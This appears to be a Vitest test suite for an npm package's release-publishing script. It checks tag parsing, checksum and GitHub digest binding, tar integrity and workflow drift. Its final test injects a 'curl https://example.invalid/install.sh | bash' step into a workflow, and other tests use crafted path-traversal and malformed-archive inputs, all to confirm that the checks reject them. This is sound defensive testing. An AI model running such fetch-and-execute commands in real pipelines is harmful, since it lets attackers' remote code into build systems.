import { createHash } from 'node:crypto';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { gunzipSync, gzipSync } from 'node:zlib';
import { describe, expect, it } from 'vitest';

type Request = {
  verifyOnly: boolean;
  tag: string;
  version: string;
  repository: string;
  directory: string;
  npmExecPath: string;
};

type LocalAssets = {
  request: Request;
  tarball: string;
  assets: Array<{ name: string; path: string; sha256: string }>;
};

type Verification = {
  valid: true;
  repository: string;
  tag: string;
  version: string;
  tarball: string;
  assets: Array<{ name: string; sha256: string }>;
};

type ReleasePublishModule = {
  parseReleasePublishArguments(args: string[], cwd: string, npmExecPath?: string): Request;
  validateLocalReleaseAssets(request: Request): LocalAssets;
  bindGithubReleaseAssets(
    local: LocalAssets,
    dependencies?: { execFileSync?: (...args: unknown[]) => string },
  ): LocalAssets;
  inspectNpmTarball(local: LocalAssets): Verification;
  runReleasePublish(
    args: string[],
    environment: NodeJS.ProcessEnv,
    dependencies?: {
      cwd?: string;
      npmExecPath?: string;
      execFileSync?: (...args: unknown[]) => string | Buffer;
      writeStdout?: (text: string) => void;
    },
  ): Verification;
};

type Fixture = {
  root: string;
  directory: string;
  npmExecPath: string;
  tag: string;
  version: string;
  repository: string;
  digests: Record<string, string>;
};

const repositoryRoot = resolve(import.meta.dirname, '..');
let loadedModule: Promise<ReleasePublishModule> | undefined;

function releaseModule(): Promise<ReleasePublishModule> {
  if (loadedModule) return loadedModule;
  const root = mkdtempSync(join(tmpdir(), 'musubix3-release-import-'));
  const directory = join(root, 'release-assets');
  const npmExecPath = join(root, 'npm-cli.js');
  mkdirSync(directory);
  writeFileSync(join(directory, 'safe.tgz'), 'not published');
  writeFileSync(npmExecPath, 'process.exitCode = 0;\n');
  const previousExecPath = process.env.npm_execpath;
  const previousArgument = process.argv[2];
  process.env.npm_execpath = npmExecPath;
  process.argv[2] = directory;
  loadedModule = import(`${pathToFileURL(resolve(repositoryRoot, 'scripts/release-publish.mjs')).href}?test-import`)
    .finally(() => {
      if (previousExecPath === undefined) delete process.env.npm_execpath;
      else process.env.npm_execpath = previousExecPath;
      if (previousArgument === undefined) process.argv.splice(2, 1);
      else process.argv[2] = previousArgument;
    }) as unknown as Promise<ReleasePublishModule>;
  return loadedModule;
}

function sha256(value: Buffer | string): string {
  return createHash('sha256').update(value).digest('hex');
}

function writeTarString(header: Buffer, offset: number, length: number, value: string): void {
  const bytes = Buffer.from(value);
  if (bytes.length > length) throw new Error(`tar field too long: ${value}`);
  bytes.copy(header, offset);
}

function writeTarOctal(header: Buffer, offset: number, length: number, value: number): void {
  writeTarString(header, offset, length, `${value.toString(8).padStart(length - 1, '0')}\0`);
}

function tarEntry(
  name: string,
  content: Buffer,
  type = '0',
  prefix = '',
): Buffer {
  const header = Buffer.alloc(512);
  writeTarString(header, 0, 100, name);
  writeTarOctal(header, 100, 8, type === '5' ? 0o755 : 0o644);
  writeTarOctal(header, 108, 8, 0);
  writeTarOctal(header, 116, 8, 0);
  writeTarOctal(header, 124, 12, content.length);
  writeTarOctal(header, 136, 12, 0);
  header.fill(0x20, 148, 156);
  writeTarString(header, 156, 1, type);
  writeTarString(header, 257, 6, 'ustar\0');
  writeTarString(header, 263, 2, '00');
  writeTarString(header, 345, 155, prefix);
  const checksum = header.reduce((sum, byte) => sum + byte, 0);
  writeTarString(header, 148, 8, `${checksum.toString(8).padStart(6, '0')}\0 `);
  const padding = Buffer.alloc((512 - (content.length % 512)) % 512);
  return Buffer.concat([header, content, padding]);
}

function tarball(
  version: string,
  options: { duplicate?: boolean; type?: string; prefix?: string } = {},
): Buffer {
  const manifest = Buffer.from(`${JSON.stringify({ name: 'musubix3', version })}\n`);
  const entries = [
    tarEntry('package/', Buffer.alloc(0), '5'),
    tarEntry('package/package.json', manifest, options.type ?? '0', options.prefix ?? ''),
  ];
  if (options.duplicate) entries.push(tarEntry('package/package.json', manifest));
  return gzipSync(Buffer.concat([...entries, Buffer.alloc(1024)]));
}

function duplicateNullManifestTarball(version: string): Buffer {
  return gzipSync(Buffer.concat([
    tarEntry('package/', Buffer.alloc(0), '5'),
    tarEntry('package/package.json', Buffer.from('null\n')),
    tarEntry('package/package.json', Buffer.from(`${JSON.stringify({ name: 'musubix3', version })}\n`)),
    Buffer.alloc(1024),
  ]));
}

function fixture(): Fixture {
  const root = mkdtempSync(join(tmpdir(), 'musubix3-release-publish-'));
  const directory = join(root, 'release-assets');
  mkdirSync(directory);
  const version = '1.2.3';
  const tag = `v${version}`;
  const repository = 'owner/repository';
  const npmExecPath = join(root, 'npm-cli.js');
  writeFileSync(npmExecPath, 'process.exitCode = 0;\n');
  chmodSync(npmExecPath, 0o755);

  const files: Record<string, Buffer> = {
    [`musubix3-${version}.tgz`]: tarball(version),
    'musubix3.cdx.json': Buffer.from('{"bomFormat":"CycloneDX"}\n'),
    'musubix3-attestation.json': Buffer.from('{"schemaVersion":1}\n'),
  };
  const sums = [
    `${sha256(files[`musubix3-${version}.tgz`]!)}  musubix3-${version}.tgz`,
    `${sha256(files['musubix3.cdx.json']!)}  musubix3.cdx.json`,
  ].sort().join('\n');
  files.SHA256SUMS = Buffer.from(`${sums}\n`);
  for (const [name, content] of Object.entries(files)) writeFileSync(join(directory, name), content);
  return {
    root,
    directory,
    npmExecPath,
    tag,
    version,
    repository,
    digests: Object.fromEntries(Object.entries(files).map(([name, content]) => [name, sha256(content)])),
  };
}

function request(input: Fixture, verifyOnly = true): Request {
  return {
    verifyOnly,
    tag: input.tag,
    version: input.version,
    repository: input.repository,
    directory: input.directory,
    npmExecPath: input.npmExecPath,
  };
}

function githubRelease(input: Fixture): string {
  return JSON.stringify({
    tagName: input.tag,
    isDraft: false,
    assets: Object.entries(input.digests).map(([name, digest]) => ({
      name,
      digest: `sha256:${digest}`,
      state: 'uploaded',
    })),
  });
}

function replaceTarball(input: Fixture, bytes: Buffer): void {
  const name = `musubix3-${input.version}.tgz`;
  writeFileSync(join(input.directory, name), bytes);
  input.digests[name] = sha256(bytes);
  const checksum = [
    `${input.digests[name]}  ${name}`,
    `${input.digests['musubix3.cdx.json']}  musubix3.cdx.json`,
  ].sort().join('\n');
  writeFileSync(join(input.directory, 'SHA256SUMS'), `${checksum}\n`);
  input.digests.SHA256SUMS = sha256(`${checksum}\n`);
}

describe('release asset publishing', () => {
  /** @id TEST-RELEASE-ASSET-PUBLISHING-001
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-001
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-001 requires one canonical explicit release identity', async () => {
    const api = await releaseModule();
    const input = fixture();
    const args = [
      '--verify-only', '--tag', input.tag,
      '--repository', input.repository,
      '--directory', input.directory,
    ];
    expect(api.parseReleasePublishArguments(args, input.root, input.npmExecPath))
      .toEqual(request(input));
    expect(api.parseReleasePublishArguments(args.slice(1), input.root, input.npmExecPath))
      .toEqual(request(input, false));
    for (const invalid of [
      ['--verify-only', '--tag', '1.2.3', '--repository', input.repository, '--directory', input.directory],
      ['--verify-only', '--tag', 'v1.2.3-rc.1', '--repository', input.repository, '--directory', input.directory],
      ['--verify-only', '--repository', input.repository, '--tag', input.tag, '--directory', input.directory],
      [...args, '--tag', input.tag],
    ]) {
      expect(() => api.parseReleasePublishArguments(invalid, input.root, input.npmExecPath)).toThrow();
    }
    expect(() => api.parseReleasePublishArguments(args, input.root, undefined)).toThrow();
    const linked = join(input.root, 'linked-npm.js');
    symlinkSync(input.npmExecPath, linked);
    expect(() => api.parseReleasePublishArguments(args, input.root, linked)).toThrow();
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-002
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-002
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-002 rejects missing, stale, extra, and linked tarballs', async () => {
    const api = await releaseModule();
    const input = fixture();
    expect(api.validateLocalReleaseAssets(request(input)).assets.map((asset) => asset.name))
      .toEqual(['SHA256SUMS', 'musubix3-1.2.3.tgz', 'musubix3-attestation.json', 'musubix3.cdx.json']);
    writeFileSync(join(input.directory, 'musubix3-1.2.2.tgz'), tarball('1.2.2'));
    expect(() => api.validateLocalReleaseAssets(request(input))).toThrow(/musubix3-1\.2\.3\.tgz/);

    const linked = fixture();
    const expected = join(linked.directory, `musubix3-${linked.version}.tgz`);
    const target = join(linked.root, 'target.tgz');
    writeFileSync(target, readFileSync(expected));
    writeFileSync(expected, '');
    expect(lstatSync(expected).isFile()).toBe(true);
    symlinkSync(target, join(linked.directory, 'extra-link.tgz'));
    expect(() => api.validateLocalReleaseAssets(request(linked))).toThrow();
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-003
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-003
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-003 binds GitHub digests before strict archive identity inspection', async () => {
    const api = await releaseModule();
    const input = fixture();
    const local = api.validateLocalReleaseAssets(request(input));
    const bound = api.bindGithubReleaseAssets(local, {
      execFileSync: () => githubRelease(input),
    });
    expect(api.inspectNpmTarball(bound)).toMatchObject({
      valid: true,
      repository: input.repository,
      tag: input.tag,
      version: input.version,
      tarball: resolve(input.directory, `musubix3-${input.version}.tgz`),
    });
    expect(() => api.bindGithubReleaseAssets(local, {
      execFileSync: () => githubRelease({
        ...input,
        digests: { ...input.digests, [`musubix3-${input.version}.tgz`]: '0'.repeat(64) },
      }),
    })).toThrow();

    for (const options of [{ duplicate: true }, { type: 'x' }, { prefix: 'evil' }]) {
      const malformed = fixture();
      const name = `musubix3-${malformed.version}.tgz`;
      const bytes = tarball(malformed.version, options);
      writeFileSync(join(malformed.directory, name), bytes);
      malformed.digests[name] = sha256(bytes);
      const checksum = [
        `${malformed.digests[name]}  ${name}`,
        `${malformed.digests['musubix3.cdx.json']}  musubix3.cdx.json`,
      ].sort().join('\n');
      writeFileSync(join(malformed.directory, 'SHA256SUMS'), `${checksum}\n`);
      malformed.digests.SHA256SUMS = sha256(`${checksum}\n`);
      const malformedLocal = api.validateLocalReleaseAssets(request(malformed));
      const malformedBound = api.bindGithubReleaseAssets(malformedLocal, {
        execFileSync: () => githubRelease(malformed),
      });
      expect(() => api.inspectNpmTarball(malformedBound)).toThrow();
    }
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-004
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-004
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-004 shares verification and permits provenance publishing only in matching GitHub Actions', async () => {
    const api = await releaseModule();
    const input = fixture();
    const args = [
      '--verify-only', '--tag', input.tag,
      '--repository', input.repository,
      '--directory', input.directory,
    ];
    const stdout: string[] = [];
    const calls: unknown[][] = [];
    const verification = api.runReleasePublish(args, {}, {
      cwd: input.root,
      npmExecPath: input.npmExecPath,
      execFileSync: (...call) => {
        calls.push(call);
        return githubRelease(input);
      },
      writeStdout: (text) => stdout.push(text),
    });
    expect(JSON.parse(stdout.join(''))).toEqual(verification);
    expect(Object.keys(verification)).toEqual([
      'valid', 'repository', 'tag', 'version', 'tarball', 'assets',
    ]);
    expect(calls).toHaveLength(1);

    const publishArgs = args.slice(1);
    expect(() => api.runReleasePublish(publishArgs, {}, {
      cwd: input.root,
      npmExecPath: input.npmExecPath,
      execFileSync: () => githubRelease(input),
    })).toThrow();

    const publishCalls: unknown[][] = [];
    api.runReleasePublish(publishArgs, {
      GITHUB_ACTIONS: 'true',
      GITHUB_REPOSITORY: input.repository,
      NODE_AUTH_TOKEN: 'token',
    }, {
      cwd: input.root,
      npmExecPath: input.npmExecPath,
      execFileSync: (...call) => {
        publishCalls.push(call);
        return call[0] === 'gh' ? githubRelease(input) : '';
      },
    });
    expect(publishCalls[1]?.[0]).toBe(process.execPath);
    expect(publishCalls[1]?.[1]).toEqual([
      input.npmExecPath,
      'publish',
      resolve(input.directory, `musubix3-${input.version}.tgz`),
      '--provenance',
      '--access',
      'public',
    ]);

    const releaseWorkflow = readFileSync('.github/workflows/release.yml', 'utf8');
    const publishWorkflow = readFileSync('.github/workflows/npm-publish.yml', 'utf8');
    for (const workflow of [releaseWorkflow, publishWorkflow]) {
      expect(workflow).toContain('npm run --silent release:publish --');
      expect(workflow).not.toMatch(/run:\s+npm publish /);
    }
    expect(releaseWorkflow).toContain('inputs.publish_npm == true || vars.NPM_TRUSTED_PUBLISHING');
    expect(readFileSync('README.md', 'utf8')).toContain('gh release download');
    expect(readFileSync('README-ja.md', 'utf8')).toContain('gh release download');
    expect(basename(verification.tarball)).toBe(`musubix3-${input.version}.tgz`);
  });

  it('rejects malformed release metadata, checksums, and tar structures', async () => {
    const api = await releaseModule();
    const input = fixture();
    const local = api.validateLocalReleaseAssets(request(input));
    const release = JSON.parse(githubRelease(input));
    for (const invalid of [
      { ...release, tagName: 'v9.9.9' },
      { ...release, isDraft: true },
      {
        ...release,
        assets: release.assets.map((asset: { name: string }) => (
          asset.name === `musubix3-${input.version}.tgz` ? { ...asset, state: 'new' } : asset
        )),
      },
      {
        ...release,
        assets: release.assets.map((asset: { name: string }) => (
          asset.name === `musubix3-${input.version}.tgz` ? { ...asset, digest: null } : asset
        )),
      },
    ]) {
      expect(() => api.bindGithubReleaseAssets(local, {
        execFileSync: () => JSON.stringify(invalid),
      })).toThrow();
    }
    expect(() => api.bindGithubReleaseAssets(local, {
      execFileSync: () => { throw new Error('gh unavailable'); },
    })).toThrow(/Unable to query GitHub Release/);
    expect(() => api.bindGithubReleaseAssets(local, { execFileSync: () => '{' })).toThrow(/JSON/);

    for (const malformedChecksums of [
      `${input.digests[`musubix3-${input.version}.tgz`]!.toUpperCase()}  musubix3-${input.version}.tgz\n${input.digests['musubix3.cdx.json']}  musubix3.cdx.json\n`,
      `${input.digests[`musubix3-${input.version}.tgz`]} musubix3-${input.version}.tgz\n${input.digests['musubix3.cdx.json']}  musubix3.cdx.json\n`,
      `${input.digests[`musubix3-${input.version}.tgz`]}  musubix3-${input.version}.tgz\n${input.digests['musubix3.cdx.json']}  musubix3.cdx.json`,
    ]) {
      const checksums = fixture();
      writeFileSync(join(checksums.directory, 'SHA256SUMS'), malformedChecksums);
      expect(() => api.validateLocalReleaseAssets(request(checksums))).toThrow();
    }

    for (const corrupt of [
      (bytes: Buffer) => {
        const tar = gunzipSync(bytes);
        tar[0] = tar[0] === 0x70 ? 0x71 : 0x70;
        return gzipSync(tar);
      },
      (bytes: Buffer) => gzipSync(gunzipSync(bytes).subarray(0, -512)),
      (bytes: Buffer) => {
        const tar = gunzipSync(bytes);
        tar[124] = 0x80;
        return gzipSync(tar);
      },
    ]) {
      const malformed = fixture();
      replaceTarball(malformed, corrupt(readFileSync(join(
        malformed.directory,
        `musubix3-${malformed.version}.tgz`,
      ))));
      const bound = api.bindGithubReleaseAssets(
        api.validateLocalReleaseAssets(request(malformed)),
        { execFileSync: () => githubRelease(malformed) },
      );
      expect(() => api.inspectNpmTarball(bound)).toThrow();
    }

    const prefixed = fixture();
    replaceTarball(prefixed, gzipSync(Buffer.concat([
      tarEntry('package/', Buffer.alloc(0), '5'),
      tarEntry(
        'package/package.json',
        Buffer.from(`${JSON.stringify({ name: 'musubix3', version: prefixed.version })}\n`),
      ),
      tarEntry('NOTICE', Buffer.from('notice\n'), '0', 'package/docs'),
      Buffer.alloc(1024),
    ])));
    const prefixedBound = api.bindGithubReleaseAssets(
      api.validateLocalReleaseAssets(request(prefixed)),
      { execFileSync: () => githubRelease(prefixed) },
    );
    expect(api.inspectNpmTarball(prefixedBound)).toMatchObject({ valid: true });
  });

  it('preserves optional npm tokens and rechecks the tarball before publishing', async () => {
    const api = await releaseModule();
    const input = fixture();
    const args = [
      '--tag', input.tag,
      '--repository', input.repository,
      '--directory', input.directory,
    ];
    for (const token of ['token', undefined]) {
      const calls: unknown[][] = [];
      api.runReleasePublish(args, {
        GITHUB_ACTIONS: 'true',
        GITHUB_REPOSITORY: input.repository,
        ...(token ? { NODE_AUTH_TOKEN: token } : {}),
      }, {
        cwd: input.root,
        npmExecPath: input.npmExecPath,
        execFileSync: (...call) => {
          calls.push(call);
          return call[0] === 'gh' ? githubRelease(input) : '';
        },
      });
      const publishEnvironment = (calls[1]?.[2] as { env?: NodeJS.ProcessEnv }).env;
      if (token) expect(publishEnvironment?.NODE_AUTH_TOKEN).toBe(token);
      else expect(publishEnvironment).not.toHaveProperty('NODE_AUTH_TOKEN');
    }

    const changed = fixture();
    let publishCalls = 0;
    expect(() => api.runReleasePublish([
      '--tag', changed.tag,
      '--repository', changed.repository,
      '--directory', changed.directory,
    ], {
      GITHUB_ACTIONS: 'true',
      GITHUB_REPOSITORY: changed.repository,
    }, {
      cwd: changed.root,
      npmExecPath: changed.npmExecPath,
      execFileSync: (...call) => {
        if (call[0] === 'gh') {
          writeFileSync(join(changed.directory, `musubix3-${changed.version}.tgz`), 'changed');
          return githubRelease(changed);
        }
        publishCalls += 1;
        return '';
      },
    })).toThrow(/changed before publish/);
    expect(publishCalls).toBe(0);
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-005
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-004
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-005 preserves historical workflow policy while accepting the reviewed publish contract', () => {
    const report = JSON.parse(execFileSync(
      process.execPath,
      ['scripts/check-github-actions.mjs', 'workflows'],
      { cwd: repositoryRoot, encoding: 'utf8' },
    )) as { valid: boolean; diagnostics: unknown[] };
    expect(report).toEqual({ valid: true, diagnostics: [] });
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-006
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-003
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-006 binds inspected bytes and rejects a null duplicate manifest', async () => {
    const api = await releaseModule();
    const input = fixture();
    const name = `musubix3-${input.version}.tgz`;
    const bytes = duplicateNullManifestTarball(input.version);
    writeFileSync(join(input.directory, name), bytes);
    input.digests[name] = sha256(bytes);
    const checksum = [
      `${input.digests[name]}  ${name}`,
      `${input.digests['musubix3.cdx.json']}  musubix3.cdx.json`,
    ].sort().join('\n');
    writeFileSync(join(input.directory, 'SHA256SUMS'), `${checksum}\n`);
    input.digests.SHA256SUMS = sha256(`${checksum}\n`);
    const local = api.validateLocalReleaseAssets(request(input));
    const bound = api.bindGithubReleaseAssets(local, {
      execFileSync: () => githubRelease(input),
    });
    expect(() => api.inspectNpmTarball(bound)).toThrow(/one unprefixed package\/package\.json/);

    const stable = fixture();
    const stableLocal = api.validateLocalReleaseAssets(request(stable));
    const stableBound = api.bindGithubReleaseAssets(stableLocal, {
      execFileSync: () => githubRelease(stable),
    });
    writeFileSync(stableBound.tarball, 'changed after digest verification');
    expect(api.inspectNpmTarball(stableBound)).toMatchObject({ valid: true, tag: stable.tag });
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-007
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-004
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-007 validates a tag before checkout and detects privileged workflow drift', () => {
    const standalone = readFileSync('.github/workflows/npm-publish.yml', 'utf8');
    expect(standalone.indexOf('Verify stable GitHub Release tag'))
      .toBeLessThan(standalone.indexOf('actions/checkout@'));
    expect(standalone).toContain('git/ref/tags/$RELEASE_TAG');

    const root = mkdtempSync(join(tmpdir(), 'musubix3-workflow-drift-'));
    const workflowDirectory = join(root, '.github/workflows');
    mkdirSync(workflowDirectory, { recursive: true });
    for (const name of ['ci.yml', 'release.yml', 'npm-publish.yml', 'dependency-audit.yml']) {
      const source = readFileSync(resolve(repositoryRoot, '.github/workflows', name), 'utf8');
      writeFileSync(
        join(workflowDirectory, name),
        name === 'release.yml'
          ? source.replace(
            "if: needs.validate.outputs.stable_tag == 'true' && (inputs.publish_npm == true || vars.NPM_TRUSTED_PUBLISHING == 'true')",
            'if: always()',
          )
          : source,
      );
    }
    const result = spawnSync(process.execPath, ['scripts/check-github-actions.mjs', 'workflows'], {
      cwd: repositoryRoot,
      encoding: 'utf8',
      env: { ...process.env, GITHUB_ACTIONS_WORKFLOW_ROOT: root },
    });
    const report = JSON.parse(result.stdout) as { valid: boolean; diagnostics: Array<{ code: string }> };
    expect(report.valid).toBe(false);
    expect(report.diagnostics.some(({ code }) => code === 'WORKFLOW_PROTECTED_DRIFT')).toBe(true);
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-008
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-004
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-008 binds privileged checkouts to fully qualified tag refs', () => {
    const releaseWorkflow = readFileSync('.github/workflows/release.yml', 'utf8');
    const publishWorkflow = readFileSync('.github/workflows/npm-publish.yml', 'utf8');
    expect(releaseWorkflow).toContain(
      'ref: refs/tags/${{ github.event.inputs.release_tag || github.ref_name }}',
    );
    expect(publishWorkflow).toContain('ref: refs/tags/${{ inputs.release_tag }}');
    expect(publishWorkflow).not.toMatch(/^\s+ref: \$\{\{ inputs\.release_tag \}\}$/m);
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-009
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-001
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-009 rejects dot-segment repository identities', async () => {
    const api = await releaseModule();
    const input = fixture();
    for (const repository of ['../repository', 'owner/..', './repository', 'owner/.']) {
      expect(() => api.parseReleasePublishArguments([
        '--verify-only',
        '--tag', input.tag,
        '--repository', repository,
        '--directory', input.directory,
      ], input.root, input.npmExecPath)).toThrow(/repository/);
    }
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-010
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-001 REQ-RELEASE-ASSET-PUBLISHING-004
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-010 preserves canonical repository and tag-ref trust boundaries', async () => {
    const api = await releaseModule();
    const input = fixture();
    expect(() => api.parseReleasePublishArguments([
      '--verify-only',
      '--tag', input.tag,
      '--repository', '../repository',
      '--directory', input.directory,
    ], input.root, input.npmExecPath)).toThrow(/repository/);
    expect(readFileSync('.github/workflows/npm-publish.yml', 'utf8'))
      .toContain('ref: refs/tags/${{ inputs.release_tag }}');
    expect(readFileSync('.github/workflows/release.yml', 'utf8'))
      .toContain('ref: refs/tags/${{ github.event.inputs.release_tag || github.ref_name }}');
  });

  /** @id TEST-RELEASE-ASSET-PUBLISHING-011
   * @verifies REQ-RELEASE-ASSET-PUBLISHING-002 REQ-RELEASE-ASSET-PUBLISHING-003
   */
  it('TEST-RELEASE-ASSET-PUBLISHING-011 preserves the closed asset set and digest-bound bytes', async () => {
    const api = await releaseModule();
    const input = fixture();
    const local = api.validateLocalReleaseAssets(request(input));
    expect(local.assets.map(({ name }) => name)).toEqual([
      'SHA256SUMS',
      `musubix3-${input.version}.tgz`,
      'musubix3-attestation.json',
      'musubix3.cdx.json',
    ]);
    const bound = api.bindGithubReleaseAssets(local, {
      execFileSync: () => githubRelease(input),
    });
    writeFileSync(bound.tarball, 'changed after binding');
    expect(api.inspectNpmTarball(bound)).toMatchObject({ valid: true, tag: input.tag });
  });

  it('detects dependency, checkout-ref, and command drift in privileged publishing jobs', () => {
    for (const [workflowName, mutate] of [
      ['release.yml', (source: string) => source.replace(
        'needs: [validate, attest, github-release]',
        'needs: [validate]',
      )],
      ['npm-publish.yml', (source: string) => source.replace(
        'ref: refs/tags/${{ inputs.release_tag }}',
        'ref: main',
      )],
      ['npm-publish.yml', (source: string) => source.replace(
        '- run: npm ci',
        '- run: curl https://example.invalid/install.sh | bash',
      )],
    ] as const) {
      const driftRoot = mkdtempSync(join(tmpdir(), 'musubix3-workflow-drift-'));
      const workflowDirectory = join(driftRoot, '.github/workflows');
      mkdirSync(workflowDirectory, { recursive: true });
      for (const name of ['ci.yml', 'release.yml', 'npm-publish.yml']) {
        const source = readFileSync(resolve(repositoryRoot, '.github/workflows', name), 'utf8');
        writeFileSync(join(workflowDirectory, name), name === workflowName ? mutate(source) : source);
      }
      const result = spawnSync(process.execPath, ['scripts/check-github-actions.mjs', 'workflows'], {
        cwd: repositoryRoot,
        encoding: 'utf8',
        env: { ...process.env, GITHUB_ACTIONS_WORKFLOW_ROOT: driftRoot },
      });
      const report = JSON.parse(result.stdout) as { valid: boolean; diagnostics: Array<{ code: string }> };
      expect(report.valid).toBe(false);
      expect(report.diagnostics.some(({ code }) => code === 'WORKFLOW_PROTECTED_DRIFT')).toBe(true);
    }
  });
});
